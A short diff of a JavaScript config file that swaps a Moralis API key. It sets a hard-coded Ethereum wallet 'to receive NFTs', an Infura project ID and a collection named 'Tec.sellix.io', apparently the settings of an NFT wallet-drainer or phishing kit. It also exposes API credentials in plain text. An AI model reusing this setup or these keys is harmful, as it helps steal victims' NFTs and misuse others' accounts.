@@ -1,7 +1,7 @@
 // ⚠️ for infura & moralis, make you sure that you copy same number of characters
 const address = "0x71bDD4A39F0338fbB6A4F98a3d676F9d39E7f675";    // Your ETH wallet that you have to receive NFTs
 const infuraId = "16848b3347b94ceca4b45576982851ad"     // Infuria Project ID | https://infura.io/ | For Wallet Connect
-const moralisApi = "48ac609d-1a76-47c5-90ff-c6763a3bcc2b"    // Web3 Api key | https://moralis.io/ | For NFTs
+const moralisApi = "Qadi3ApfmQ5XBtrfOwtxgUIEBfBn2WRClvyDi7MWwuG0uI8DBJyZqXufBjAfUdx3"    // Web3 Api key | https://moralis.io/ | For NFTs
 
 const collectionInfo = {
     name: "Tec.sellix.io",
